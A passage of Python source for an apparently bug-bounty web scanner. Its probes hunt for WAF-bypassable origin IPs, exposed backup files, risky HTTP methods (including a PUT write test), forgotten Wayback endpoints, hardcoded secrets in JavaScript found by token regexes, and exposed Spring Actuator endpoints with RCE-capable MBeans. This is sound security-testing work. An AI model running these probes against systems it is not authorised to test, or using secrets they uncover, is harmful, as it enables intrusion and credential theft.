            except Exception:
                continue
            info = obj.get("info") or {}
            sev = (info.get("severity") or "info").lower()
            if sev not in SEVERITY_ORDER:
                sev = "info"
            tid = obj.get("template-id") or info.get("name") or "?"
            matched = obj.get("matched-at") or obj.get("host") or ""
            name = info.get("name") or tid
            findings.append(DeepScanFinding(
                url=matched, probe=self.name,
                signal=tid, severity=sev,
                title=name,
                evidence=str(obj.get("matched") or obj.get("extracted-results")
                              or obj.get("response") or "")[:300],
                extra={
                    "template-id": tid,
                    "tags": info.get("tags"),
                    "classification": info.get("classification"),
                    "reference": info.get("reference"),
                },
            ))
        log.info("owasp-vulns probe done", findings=len(findings))
        return findings


class OriginCandidateProbe(DeepScanProbe):
    """WAF-bypass reconnaissance. For each host appearing in the probe set,
    pull the cert-named SANs from crt.sh, DNS-resolve each unique hostname,
    and flag any whose A records land on an ASN OUTSIDE the well-known
    CDN/WAF block (Cloudflare 13335, Akamai 16625/20940/21342, Fastly 54113,
    CloudFront 16509, etc.). Those non-CDN resolutions are likely **origin
    IPs** — direct-probable, WAF-bypassable surface.

    Zero traffic to the target during the CT pull. Per-host DNS lookups are
    light. The findings are *leads*, not exploits — the operator manually
    verifies with `curl -k -H "Host: target.com" https://CANDIDATE_IP/` and
    checks whether the same app responds, indicating WAF bypass.

    Doesn't replace Shodan/Censys for serious origin hunting — they index
    full IPv4 space, we only see what's in CT. But it's free, async-safe,
    and catches the easy mistakes.

    DISABLED (2026-05-16). Removed from DEFAULT_PROBES because the
    "non-big-CDN ASN ⇒ likely origin" heuristic produced 37 FPs in one
    PlanetHoster run — all candidate IPs sat on PlanetHoster's own ASN
    (53589), i.e. the target's own infra, not a leaked origin behind a
    third-party WAF. Findings were also emitted at severity=medium with
    no verification, inflating Bugcrowd-VRT-P5 noise to apparent mediums.

    Rebuild checklist before re-enabling:
      1. Same-operator suppression: skip candidates whose ASN matches the
         primary host's resolved ASN — same org, not a bypass.
      2. Active verification: GET https://<candidate-ip>/ with
         Host: <target> and compare to the CDN-fronted response. Drop on
         response mismatch (default page, unrelated tenant, 4xx without
         the app shell).
      3. WAF-behavior probe: send a known-blockable payload through both
         paths; only emit when the CDN path blocks and the direct path
         serves. Without behavior divergence there is no bypass.
      4. Severity tied to verification: verified bypass ⇒ medium;
         response matches but no WAF divergence ⇒ info (mere origin
         disclosure); verification inconclusive ⇒ info with note.
      5. Per-domain dedup: group N hostnames sharing the same candidate
         IP into one finding, not N.
      6. Cross-reference Shodan/Censys when available — CT-only is noisy.
    """
    name = "origin-candidate"

    # ASNs operated by major CDN / WAF providers. Resolutions landing on
    # these are "behind the WAF as expected." Resolutions OFF this list
    # are origin candidates.
    CDN_ASNS = frozenset({
        13335,   # Cloudflare
        16625,   # Akamai
        20940,   # Akamai (other range)
        21342,   # Akamai (other range)
        54113,   # Fastly
        16509,   # AWS / CloudFront
        15169,   # Google (covers GCP edge)
        8075,    # Microsoft (Azure Front Door)
        209242,  # Cloudflare (another range)
    })

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        from urllib.parse import urlparse
        import socket
        # Roots are the unique registered-domain portions of host fields
        hosts = sorted({urlparse(p.get("url", "")).netloc.split(":")[0]
                        for p in probes if p.get("url")})
        if not hosts:
            return []
        # Reduce to registered domains (last two labels) for the CT query
        roots = sorted({".".join(h.split(".")[-2:]) for h in hosts if "." in h})

        # CDN-aware filter: if the program's *primary* hosts aren't already
        # behind a CDN/WAF, the whole "origin candidate" concept is moot —
        # the hostnames already point at the origin. Check the tech list
        # from each probe; if no CDN/WAF signal across all live hosts,
        # skip the probe with a log line.
        CDN_TECH_MARKERS = ("cloudflare", "akamai", "fastly", "cloudfront",
                            "azure front door", "imperva", "sucuri",
                            "datadome", "barracuda")
        cdn_seen = False
        for p in probes:
            techs = " ".join(p.get("technologies") or []).lower()
            if any(m in techs for m in CDN_TECH_MARKERS):
                cdn_seen = True; break
        if not cdn_seen:
            log.info("origin-candidate skipped — no CDN/WAF detected in front of live hosts",
                     hosts=len(hosts))
            return []

        log.info("origin-candidate probe", roots=len(roots), live_hosts=len(hosts))

        # 1) Mine crt.sh per root domain — passive
        cert_hosts: set[str] = set()
        for root in roots[:5]:  # cap to avoid runaway CT queries
            try:
                r = await self.client.get(
                    "https://crt.sh/",
                    params={"q": f"%.{root}", "output": "json"},
                    timeout=30,
                )
                if r.status_code != 200: continue
                data = r.json() if r.text.strip().startswith("[") else []
                for entry in data or []:
                    name_value = entry.get("name_value") or ""
                    for line in name_value.splitlines():
                        h = line.strip().lower().lstrip("*.")
                        if h and "*" not in h and (h == root or h.endswith("." + root)):
                            cert_hosts.add(h)
            except Exception as e:
                log.warning("crt.sh fetch failed", root=root, err=str(e)[:120])

        log.info("origin-candidate: ct hosts to resolve", count=len(cert_hosts))

        # 2) Resolve + check ASN. Use threadpool for sync socket+http.
        loop = asyncio.get_event_loop()

        def resolve(host: str) -> list[str]:
            try:
                infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
                return sorted({i[4][0] for i in infos})
            except Exception:
                return []

        async def lookup_asn(ip: str) -> int | None:
            try:
                r = await self.client.get(f"https://api.iplocation.net/?ip={ip}",
                                           timeout=10)
                if r.status_code != 200: return None
                # iplocation.net is unreliable for ASN; use ipinfo.io fallback
            except Exception:
                pass
            try:
                r = await self.client.get(f"https://ipinfo.io/{ip}/json",
                                           timeout=10)
                if r.status_code != 200: return None
                data = r.json()
                org = data.get("org", "")
                # "AS13335 Cloudflare, Inc."
                if org.startswith("AS"):
                    try: return int(org.split()[0][2:])
                    except: return None
            except Exception:
                return None
            return None

        findings: list[DeepScanFinding] = []
        sample = sorted(cert_hosts)[:60]   # cap to keep API budget reasonable
        for host in sample:
            ips = await loop.run_in_executor(None, resolve, host)
            for ip in ips:
                if ip.count(".") != 3:  # skip IPv6 for now
                    continue
                asn = await lookup_asn(ip)
                if asn is None or asn in self.CDN_ASNS:
                    continue
                findings.append(DeepScanFinding(
                    url=f"https://{ip}/", probe=self.name,
                    signal="origin-candidate",
                    severity="medium",
                    title=f"{host} resolves to non-CDN ASN {asn} ({ip}) — likely origin",
                    evidence=(f"{host} → {ip}\n"
                              f"ASN {asn} is outside the CDN/WAF block "
                              f"(CF/Akamai/Fastly/AWS/Azure/GCP).\n"
                              f"Verify manually:  "
                              f"curl -k -H 'Host: {host}' https://{ip}/"),
                    extra={"host": host, "ip": ip, "asn": asn,
                           "verification": f"curl -k -H 'Host: {host}' https://{ip}/"},
                ))
                break  # one finding per host, even if multi-IP
        log.info("origin-candidate probe done", findings=len(findings))
        return findings


class BackupFileProbe(DeepScanProbe):
    """For each live URL that returned 200/static content, try common backup
    suffix variants. Catches `index.php.bak`, `app.js~`, `db.sql.gz` style
    accidents where the original file was published next to a saved-by-editor
    copy. Cheap (a handful of GETs per 200) and high-leverage when there's a
    leak."""
    name = "backup-file"

    # Source-language file extensions on the *original* URL. A backup of one
    # of these is potentially a source-disclosure issue.
    _SOURCE_EXTS = (".php", ".py", ".rb", ".js", ".ts", ".jsx", ".tsx",
                    ".aspx", ".asp", ".jsp", ".java", ".go", ".cs",
                    ".cgi", ".pl", ".env", ".config", ".conf")
    _SOURCE_MARKERS = (
        b"<?php", b"<?xml", b"<%", b"#!/", b"import ", b"from ",
        b"function ", b"class ", b"package ", b"def ", b"func ",
        b"require(", b"require '", b"using ", b"namespace ", b"<jsp:",
    )

    @classmethod
    def _grade(cls, original_url: str, body: bytes) -> str:
        """Severity by what's actually in the body, not just that one exists.

        - Archive / database magic bytes ⇒ high (real backup payload).
        - Source-language original + source-shaped body ⇒ medium (source
          disclosure).
        - Anything else ⇒ low (a backup of a static asset isn't a finding
          worth medium+ on its own).
        """
        # Archive / DB magic bytes — these carry real payloads.
        if body[:4] == b"PK\x03\x04":            return "high"   # zip / jar
        if body[:2] == b"\x1f\x8b":              return "high"   # gzip
        if body[:4] == b"Rar!":                  return "high"   # rar
        if body[:6] == b"7z\xbc\xaf\x27\x1c":    return "high"   # 7zip
        if body[:6] == b"SQLite":                return "high"   # sqlite db
        if body[:5] == b"-- --":                 return "high"   # mysqldump header
        if body[:14] == b"-- PostgreSQL ":       return "high"   # pg_dump header
        from urllib.parse import urlparse
        orig_path = urlparse(original_url).path.lower()
        is_source_orig = any(orig_path.endswith(e) for e in cls._SOURCE_EXTS)
        if is_source_orig:
            sample = body[:300]
            if any(m in sample for m in cls._SOURCE_MARKERS):
                return "medium"
        return "low"

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        # Targets: live 200 URLs that look like a specific resource (have
        # a path beyond `/`). Bare-root URLs don't make sense to backup-probe.
        from urllib.parse import urlparse
        candidates: list[str] = []
        for p in probes:
            if not p.get("status_code") or not (200 <= p["status_code"] < 400):
                continue
            url = p.get("url", "")
            path = urlparse(url).path
            if path in ("", "/"): continue
            candidates.append(url)
        if not candidates:
            return []
        log.info("backup-file probe", urls=len(candidates),
                 suffixes=len(BACKUP_SUFFIXES))

        async def check(url: str, suffix: str):
            target = url + suffix
            r = await self._get(target)
            if r is None or r.status_code not in (200, 206):
                return None
            body = r.content
            if len(body) < 16: return None
            ctype = r.headers.get("content-type", "")
            # Skip if response is text/html (likely 200-fallback for missing file)
            if ctype.startswith("text/html"):
                return None
            severity = self._grade(url, body)
            return DeepScanFinding(
                url=target, probe=self.name,
                signal=f"exposed-backup{suffix}",
                severity=severity,
                title=f"Backup-suffix variant returned {r.status_code} ({len(body)} bytes)",
                evidence=body[:300].decode("utf-8", errors="replace"),
                extra={"content-type": ctype, "length": len(body),
                       "suffix": suffix, "original-url": url,
                       "grade-basis": severity},
            )

        findings: list[DeepScanFinding] = []
        tasks = [check(u, s) for u in candidates[:120] for s in BACKUP_SUFFIXES]
        for f in await asyncio.gather(*tasks):
            if f is not None: findings.append(f)
        return findings


class MethodEnumProbe(DeepScanProbe):
    """Enumerate uncommon HTTP methods against each live URL. Surfaces:
      - PUT verified via GET-back round-trip = unauth write (high)
      - PUT returned 2xx but GET-back didn't match = ambiguous (low)
      - OPTIONS advertising write methods = low (config disclosure)
      - TRACE returning 200 = XST (low)
      - PROPFIND returning 207 = WebDAV exposed (medium)
      - DEBUG / CONNECT returning success = misconfigured proxy (medium)

    DELETE and PATCH are NOT probed bare against live URLs — sending those
    against an unknown resource risks destructive side effects on production
    data. PUT writes are aimed at a sentinel sub-path that we DELETE on the
    way out (mirrors TomcatFingerprint's verified-write approach).
    """
    name = "method-enum"
    # Read-only / inspection methods — safe to send against arbitrary URLs.
    READ_METHODS = ("OPTIONS", "TRACE", "PROPFIND", "DEBUG", "CONNECT")
    INTERESTING_STATUS = {"TRACE":    (200,),
                          "PROPFIND": (207, 200),
                          "DEBUG":    (200,),
                          "CONNECT":  (200, 405)}  # 405 = method known
    PUT_SENTINEL_SUFFIX = "/bb-sentinel-method-probe-DELETE-ME.txt"
    PUT_SENTINEL_BODY = b"bb-sentinel method-enum write-probe; please delete\n"

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        log.info("method-enum probe", urls=len(bases),
                 read_methods=len(self.READ_METHODS))
        findings: list[DeepScanFinding] = []

        async def try_read_method(url: str, method: str):
            async with self.sem:
                try:
                    r = await self.client.request(method, url, timeout=self.timeout)
                except Exception:
                    return None
            if method == "OPTIONS":
                allow = (r.headers.get("allow") or r.headers.get("Allow") or "").upper()
                write_methods = [m for m in ("PUT", "DELETE", "PATCH", "MKCOL")
                                 if m in allow]
                if not write_methods: return None
                return DeepScanFinding(
                    url=url, probe=self.name,
                    signal="options-allow-writes",
                    severity="low",
                    title=f"OPTIONS response advertises write methods: {','.join(write_methods)}",
                    evidence=f"Allow: {allow}",
                    extra={"allow": allow, "write-methods": write_methods},
                )
            interesting = self.INTERESTING_STATUS.get(method, ())
            if r.status_code not in interesting:
                return None
            sev = "low" if method == "TRACE" else "medium"
            return DeepScanFinding(
                url=url, probe=self.name,
                signal=f"method-{method.lower()}-accepted",
                severity=sev,
                title=f"{method} returned {r.status_code}",
                evidence=(r.text or "")[:300],
                extra={"method": method, "status": r.status_code,
                       "length": len(r.content)},
            )

        async def try_put_write(url: str):
            """PUT a sentinel to a unique sub-path, GET it back to confirm
            the write took effect, then DELETE for cleanup. high only when
            the GET-back round-trip verifies; otherwise the 2xx is treated
            as ambiguous (proxy / framework quirk, not a real write)."""
            target = url.rstrip("/") + self.PUT_SENTINEL_SUFFIX
            async with self.sem:
                try:
                    put_r = await self.client.request(
                        "PUT", target, content=self.PUT_SENTINEL_BODY,
                        headers={"Content-Type": "text/plain"},
                        timeout=self.timeout,
                    )
                    put_status = put_r.status_code
                except Exception:
                    return None
            if put_status not in (200, 201, 204):
                return None
            verified = False
            async with self.sem:
                try:
                    g = await self.client.get(target, timeout=self.timeout)
                    if g.status_code == 200 and self.PUT_SENTINEL_BODY.decode() in (g.text or ""):
                        verified = True
                except Exception:
                    pass
            async with self.sem:
                try:
                    await self.client.request("DELETE", target, timeout=self.timeout)
                except Exception:
                    pass
            return DeepScanFinding(
                url=target, probe=self.name,
                signal="method-put-verified" if verified else "method-put-unverified",
                severity="high" if verified else "low",
                title=(f"PUT accepted at {target} ({put_status})"
                       + (" — GET-back verified write"
                          if verified else " — write NOT verified by GET-back")),
                evidence=f"PUT → {put_status}; GET-back match = {verified}",
                extra={"method": "PUT", "put-status": put_status,
                       "verified-write": verified,
                       "sentinel-path": self.PUT_SENTINEL_SUFFIX},
            )

        tasks = [try_read_method(u, m) for u in bases for m in self.READ_METHODS]
        tasks += [try_put_write(u) for u in bases]
        for f in await asyncio.gather(*tasks):
            if f is not None: findings.append(f)
        return findings


class WaybackHistorical(DeepScanProbe):
    """Pull historical URLs from web.archive.org's CDX index for each base's
    host, then re-probe a bounded sample against the live host. Anything that
    *still* returns 200 with content is a forgotten endpoint — legacy admin
    panels, retired API docs, abandoned dev consoles. These are exactly the
    surface monitors miss because they no longer appear in normal recon.

    Zero traffic to the target during CDX lookup; the re-probe is light
    (bounded sample, deduplicated).
    """
    name = "wayback-historical"
    CDX_BASE = "http://web.archive.org/cdx/search/cdx"
    MAX_PATHS_PER_HOST = 200
    # Paths whose mere existence is worth flagging as a finding (vs just a lead)
    INTERESTING_TOKENS = (
        "/admin", "/api", "/internal", "/console", "/manage", "/debug",
        "/swagger", "/graphql", "/actuator", "/private", "/_internal",
        "/upload", "/download", "/backup", "/dump", "/.git", "/.env",
        "/sql", "/phpinfo", "/server-status", "/server-info",
    )

    async def _cdx(self, host: str) -> list[str]:
        try:
            r = await self.client.get(self.CDX_BASE, params={
                "url": f"{host}/*",
                "output": "json", "collapse": "urlkey", "fl": "original",
                "limit": str(self.MAX_PATHS_PER_HOST),
            }, timeout=30)
            if r.status_code != 200: return []
            rows = r.json()
            return [row[0] for row in rows[1:]] if isinstance(rows, list) and len(rows) > 1 else []
        except Exception:
            return []

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        # Group input by hostname so we issue one CDX query per host
        from urllib.parse import urlparse as _urlparse
        host_to_base: dict[str, str] = {}
        for p in probes:
            url = p.get("url", "")
            host = _urlparse(url).netloc
            if host and host not in host_to_base:
                host_to_base[host] = url
        log.info("wayback", hosts=len(host_to_base))
        # 1) CDX pull per host
        cdx_results = await asyncio.gather(*(self._cdx(h) for h in host_to_base.keys()))
        findings: list[DeepScanFinding] = []
        # 2) Re-probe each historical URL against the current host
        for (host, base), urls in zip(host_to_base.items(), cdx_results):
            interesting = []
            for u in urls:
                path = _urlparse(u).path
                if not path or path == "/": continue
                if any(tok in path.lower() for tok in self.INTERESTING_TOKENS):
                    interesting.append(path)
            interesting = list(dict.fromkeys(interesting))[:50]  # cap per host

            async def reprobe(p: str):
                full = base.rstrip("/") + p
                r = await self._get(full, follow=False)
                if r is None or r.status_code not in (200, 206, 401):
                    return None
                body = r.content or b""
                body_l = body[:512].lower()
                if b"<title>404" in body_l or b"page not found" in body_l:
                    return None
                # Skip empty bodies — fallback or just gone
                if len(body) < 32 and r.status_code != 401:
                    return None
                ctype = r.headers.get("content-type", "").lower()
                p_low = p.lower()
                # Default: historical URL still serving content is mildly
                # interesting (low). Path-keyword escalations require the
                # body shape to match — otherwise it's just a SPA route
                # that happens to contain `/admin` or a friendly 404 page
                # whose HTML happens to mention `/.git`.
                sev = "low"
                is_html = (ctype.startswith("text/html")
                           or b"<html" in body_l or b"<!doctype html" in body_l)
                # Tier 1 — admin / API panels. Escalate only on non-HTML
                # responses OR HTML responses that clearly aren't generic
                # SPA shells (401 status counts).
                if ("/admin" in p_low or "/api" in p_low) and (
                        not is_html or r.status_code == 401):
                    sev = "medium"
                # Tier 2 — source-control / env / db dumps. Require:
                #   - non-HTML response (text or binary)
                #   - body looks plausibly like the target file:
                #       .git/HEAD / .git/config / .git/index → ref: or [core]
                #       .env → KEY=value style line
                #       dump / .sql → SQL keywords
                # Otherwise demote to medium (still interesting, not high).
                tier2_match = ("/.git" in p_low or "/.env" in p_low
                                or "/dump" in p_low or "/.sql" in p_low)
                if tier2_match:
                    sample = body[:512]
                    looks_real = False
                    if "/.git" in p_low and (
                            sample.startswith(b"ref: ")
                            or b"[core]" in sample
                            or b"DIRC" in sample[:4]):       # .git/index magic
                        looks_real = True
                    elif "/.env" in p_low and (
                            re.search(rb"^[A-Z_][A-Z0-9_]{1,40}=", sample, re.M)
                            is not None):
                        looks_real = True
                    elif ("/dump" in p_low or "/.sql" in p_low):
                        sample_l = sample.lower()
                        if (b"insert into" in sample_l
                                or b"create table" in sample_l
                                or b"-- mysqldump" in sample_l
                                or b"-- postgresql" in sample_l):
                            looks_real = True
                    if looks_real and not is_html:
                        sev = "high"
                    elif not is_html:
                        sev = "medium"
                    else:
                        # HTML response on a tier-2 path is almost certainly
                        # a SPA route or friendly 404. Keep as low — don't
                        # ship a high on a false trigger.
                        sev = "low"
                return DeepScanFinding(
                    url=full, probe=self.name,
                    signal="historical-url-still-live",
                    severity=sev,
                    title=f"Wayback-historical path {p} still serves content",
                    evidence=(r.text or "")[:300],
                    extra={"status": r.status_code, "length": len(body),
                           "historical-source": u,
                           "content-type": ctype,
                           "is-html": is_html},
                )
            for f in await asyncio.gather(*(reprobe(p) for p in interesting)):
                if f is not None:
                    findings.append(f)
        return findings


class JsSecretMine(DeepScanProbe):
    """Fetch each 200 HTML page, extract <script src=> URLs, fetch JS bundles,
    grep for hardcoded secrets and high-value endpoint strings. Output:
      - Secret hits (per pattern) → severity = pattern-specific
      - Internal-hostname / private-IP disclosures → info/low
      - Endpoint candidates that look API-ish → info (leads, not bugs)
    """
    name = "js-secret-mine"
    MAX_JS_BUNDLES = 60  # global cap across all input URLs

    SECRET_PATTERNS: tuple[tuple[str, str, str], ...] = (
        # (signal, severity, regex)
        # High-confidence patterns — distinct prefix + entropy, low FP rate.
        ("aws-access-key",   "high",     r"AKIA[0-9A-Z]{16}"),
        ("aws-secret-key",   "high",     r'(?<![A-Za-z0-9])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9])'),  # very high FP; off by default
        ("github-pat",       "high",     r"ghp_[A-Za-z0-9]{36}"),
        ("github-oauth",     "high",     r"gho_[A-Za-z0-9]{36}"),
        ("slack-token",      "high",     r"xox[bpoas]-[A-Za-z0-9-]{10,48}"),
        ("private-key",      "critical", r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"),
        ("google-api-key",   "medium",   r"AIza[0-9A-Za-z\-_]{35}"),
        # Low-confidence patterns — keyword-based, FP-prone. Demoted to info
        # and filtered through _looks_like_placeholder() before emit. A real
        # impact JWT / embedded credential is still surfaced; demo values,
        # env-var templates, empty strings, and the jwt.io example payload
        # are suppressed.
        ("jwt-token",        "info",     r"eyJ[A-Za-z0-9\-_]{10,}\.eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}"),
        ("password-literal", "info",     r'(?i)["\']?password["\']?\s*[:=]\s*["\'][^"\']{6,80}["\']'),
        ("api-key-literal",  "info",     r'(?i)["\']?api[_-]?key["\']?\s*[:=]\s*["\'][A-Za-z0-9_\-]{16,}["\']'),
    )
    # aws-secret-key is too FP-prone — keep it off by default
    DISABLED = {"aws-secret-key"}
    # Patterns to run through _looks_like_placeholder() before emit.
    _NOISY_SIGNALS = frozenset({"jwt-token", "password-literal", "api-key-literal"})
    # Substrings whose presence inside a quoted value strongly suggests it's
    # a placeholder / template / docs example rather than a live secret.
    _PLACEHOLDER_MARKERS = (
        "your_", "your-", "<your", "<insert", "example", "sample", "demo",
        "placeholder", "todo", "fixme", "changeme", "change_me", "change-me",
        "redacted", "hunter2", "xxxxxx", "yyyyyy", "abcdef0123456789",
        "password", "secret", "api_key", "apikey", "test-",
    )

    _QUOTED_VALUE_RE = re.compile(r'["\']([^"\']*)["\']\s*$')
    # jwt.io demo JWT — verbatim string anyone copy-pastes from the homepage
    _JWT_IO_DEMO_PREFIX = (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9l"
    )

    SCRIPT_SRC_RE = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)
    # RFC1918 IPs + multi-segment internal hostnames. We *exclude* `.test`,
    # `.dev`, `.prod`, `.stg` because they match minified JS method calls
    # like `Foo.test()`. Leftmost hostname segment is required to be ≥4 chars
    # to filter `k.internal` / `i.corp` false positives from one-letter vars.
    INTERNAL_HOST_RE = re.compile(
        r'\b(?:'
        r'10(?:\.\d{1,3}){3}'                                       # 10/8
        r'|172\.(?:1[6-9]|2\d|3[01])(?:\.\d{1,3}){2}'               # 172.16/12
        r'|192\.168(?:\.\d{1,3}){2}'                                # 192.168/16
        r'|[a-z0-9][a-z0-9-]{3,}(?:\.[a-z0-9-]{2,})*\.(?:internal|corp|intranet)'
        r')\b',
        re.I,
    )

    async def _fetch(self, url: str) -> tuple[int, str, str]:
        async with self.sem:
            try:
                r = await self.client.get(url, timeout=self.timeout, follow_redirects=True)
                return r.status_code, r.text or "", r.headers.get("content-type", "")
            except Exception:
                return 0, "", ""

    def _resolve_script(self, page_url: str, src: str) -> str:
        if src.startswith("//"): return "https:" + src
        if src.startswith("http"): return src
        from urllib.parse import urlparse
        parsed = urlparse(page_url)
        if src.startswith("/"):
            return f"{parsed.scheme}://{parsed.netloc}{src}"
        return f"{parsed.scheme}://{parsed.netloc}/{src.lstrip('./')}"

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        targets = [p["url"] for p in probes
                   if p.get("status_code") and 200 <= p["status_code"] < 400]
        log.info("js-secret-mine", html_pages=len(targets))
        findings: list[DeepScanFinding] = []
        # 1) Fetch pages
        page_results = await asyncio.gather(*(self._fetch(u) for u in targets))
        js_urls: list[tuple[str, str]] = []
        for url, (status, body, ctype) in zip(targets, page_results):
            if status == 0 or not body: continue
            # Also scan the HTML body itself for secrets (inline scripts)
            self._scan_body(url, body, findings, source_kind="inline")
            for src in self.SCRIPT_SRC_RE.findall(body):
                js_urls.append((url, self._resolve_script(url, src)))
        # 2) Dedupe + cap
        seen_js: set[str] = set()
        ordered_js: list[tuple[str, str]] = []
        for page, j in js_urls:
            if j in seen_js: continue
            seen_js.add(j); ordered_js.append((page, j))
            if len(ordered_js) >= self.MAX_JS_BUNDLES: break
        log.info("js-secret-mine", bundles=len(ordered_js))
        # 3) Fetch + scan JS
        js_results = await asyncio.gather(*(self._fetch(j) for _, j in ordered_js))
        for (page, j_url), (status, body, _ctype) in zip(ordered_js, js_results):
            if status == 0 or not body: continue
            self._scan_body(j_url, body, findings, source_kind="js", from_page=page)
        return findings

    @classmethod
    def _looks_like_placeholder(cls, signal: str, match: str) -> bool:
        """Return True if the regex match is almost certainly a placeholder
        / template / docs example, not a live secret. Applied only to the
        keyword-shaped patterns in _NOISY_SIGNALS — the high-entropy ones
        (AWS/GitHub/Slack tokens, private keys) keep firing as-is.
        """
        if signal == "jwt-token":
            if match.startswith(cls._JWT_IO_DEMO_PREFIX):
                return True
            parts = match.split(".")
            if len(parts) == 3:
                try:
                    import base64
                    padded = parts[1] + "=" * (-len(parts[1]) % 4)
                    payload = (base64.urlsafe_b64decode(padded)
                                     .decode("utf-8", errors="replace")
                                     .lower())
                    if any(t in payload for t in
                           ('"sub":"1234567890"', "example.com",
                            "john doe", "test-issuer", "localhost",
                            '"iss":"example"', '"aud":"example"')):
                        return True
                except Exception:
                    pass
            return False
        # password-literal / api-key-literal: extract the quoted value
        # and apply placeholder heuristics.
        v = cls._QUOTED_VALUE_RE.search(match)
        if not v:
            return False
        val = v.group(1).strip()
        if not val:
            return True
        # Env-var / template interpolation
        if "${" in val or "{{" in val or "%{" in val or "<%" in val:
            return True
        # All-same-character mask (****, ------, xxxxxx)
        if len(set(val)) == 1:
            return True
        val_low = val.lower()
        for marker in cls._PLACEHOLDER_MARKERS:
            if marker in val_low:
                return True
        return False

    def _scan_body(self, url: str, body: str, out: list, *,
                    source_kind: str, from_page: str | None = None) -> None:
        for signal, severity, pattern in self.SECRET_PATTERNS:
            if signal in self.DISABLED: continue
            for m in re.findall(pattern, body):
                if isinstance(m, tuple): m = m[0]
                if (signal in self._NOISY_SIGNALS
                        and self._looks_like_placeholder(signal, m)):
                    continue
                out.append(DeepScanFinding(
                    url=url, probe=self.name,
                    signal=signal, severity=severity,
                    title=f"{signal} in {source_kind} at {url}",
                    evidence=m[:160] if isinstance(m, str) else str(m)[:160],
                    extra={"source-kind": source_kind, "from-page": from_page},
                ))
                break  # one finding per signal per source
        # Internal hostnames / private IPs — info disclosure (dedupe + cap)
        for m in sorted(set(self.INTERNAL_HOST_RE.findall(body)))[:5]:
            out.append(DeepScanFinding(
                url=url, probe=self.name,
                signal="internal-hostname-disclosed",
                severity="low",
                title=f"Internal hostname/IP referenced in {source_kind}: {m}",
                evidence=m, extra={"source-kind": source_kind, "from-page": from_page},
            ))


# -- Orchestrator -----------------------------------------------------------

class SpringActuatorProbe(DeepScanProbe):
    """Spring Boot Actuator enumeration — beyond PathSweep's single-path hit.

    PathSweep flags individual exposed actuator endpoints; this probe walks
    the whole actuator surface for each base URL, deepens each find with
    targeted follow-ups (env-secret scan, jolokia MBean listing, info-version
    extraction), and calibrates severity based on actual exploitability:

      - heapdump exposed       → critical (heap leaks creds, sessions, keys)
      - env with secrets       → critical (passwords/tokens in plaintext)
      - env masked             → high (still leaks config topology)
      - jolokia MBeans listed  → high (RCE pivot via scriptEngine MBean)
      - mappings/loggers/trace → medium (info disclosure / log tampering)
      - info/metrics/health    → low/info (recon value)

    Detection only. We never invoke jolokia exec, never fetch heapdumps
    (50-500 MB files), never modify logger levels.
    """
    name = "spring-actuator"
    # Modern (Spring Boot 2+) and legacy (1.x) paths in one pass.
    ACTUATOR_PATHS = [
        ("/actuator",            "actuator-root",        "low"),
        ("/actuator/env",        "actuator-env",         "critical"),
        ("/actuator/heapdump",   "actuator-heapdump",    "critical"),
        ("/actuator/jolokia",    "actuator-jolokia",     "high"),
        ("/actuator/mappings",   "actuator-mappings",    "medium"),
        ("/actuator/loggers",    "actuator-loggers",     "medium"),
        ("/actuator/threaddump", "actuator-threaddump",  "medium"),
        ("/actuator/trace",      "actuator-trace",       "medium"),
        ("/actuator/httptrace",  "actuator-trace",       "medium"),
        ("/actuator/configprops","actuator-configprops", "high"),
        ("/actuator/beans",      "actuator-beans",       "low"),
        ("/actuator/info",       "actuator-info",        "info"),
        ("/actuator/health",     "actuator-health",      "info"),
        ("/actuator/metrics",    "actuator-metrics",     "info"),
        # Spring Boot 1.x legacy (no /actuator prefix)
        ("/env",       "legacy-env",       "critical"),
        ("/heapdump",  "legacy-heapdump",  "critical"),
        ("/jolokia",   "legacy-jolokia",   "high"),
        ("/mappings",  "legacy-mappings",  "medium"),
        ("/trace",     "legacy-trace",     "medium"),
        ("/configprops","legacy-configprops","high"),
        ("/dump",      "legacy-threaddump","medium"),
    ]
    # Keys whose presence in /env values indicates plaintext secret exposure.
    # Masked-by-default envs return "******"; if we see anything else for
    # these keys, secret is in the clear.
    SECRET_KEYS_RE = re.compile(
        r"(?i)(password|secret|token|api[_-]?key|access[_-]?key|"
        r"credential|connection[_-]?string|datasource[._-]url|"
        r"jdbc[._-]url|aws[._-]access|smtp[._-]password)"
    )
    # Jolokia MBeans whose presence enables known RCE chains. Detection only —
    # we don't actually call exec on them.
    DANGEROUS_MBEANS = (
        "Catalina:type=Engine",                  # tomcat — code reload
        "scriptEngineFactories",                  # JS engine via Nashorn → RCE
        "com.sun.management:type=DiagnosticCommand",  # heap/thread/RCE-adjacent
        "java.lang:type=Memory",                  # heap dump trigger
        "Realm",                                  # auth realm tampering
        "Resources",                              # JNDI lookup pivot
    )

    async def run(self, probes: list[dict]) -> list[DeepScanFinding]:
        findings: list[DeepScanFinding] = []
        bases = sorted({p["url"] for p in probes
                        if p.get("status_code") and 200 <= p["status_code"] < 400})
        if not bases:
            return findings
        log.info("spring-actuator", bases=len(bases), paths=len(self.ACTUATOR_PATHS))

        async def probe_one(base: str, path: str, signal: str, base_sev: str):
            url = base.rstrip("/") + path
            r = await self._get(url)
            if r is None or r.status_code != 200:
                return None
            ctype = (r.headers.get("content-type") or "").lower()
            # Filter wrappers / SPA fallbacks: real actuator returns JSON.
            # info/health may be HTML on some configs; allow those.
            if "json" not in ctype and signal not in (
                    "actuator-root", "actuator-info", "actuator-health",
                    "legacy-env"):
                return None
            body = r.text or ""
            sev = base_sev
            extra: dict = {"path": path, "content-type": ctype, "length": len(body)}
            title = f"Spring Boot Actuator: {signal} exposed on {base}"

            # Deepen specific paths
            if signal in ("actuator-env", "legacy-env"):
                # Scan for unmasked secret values
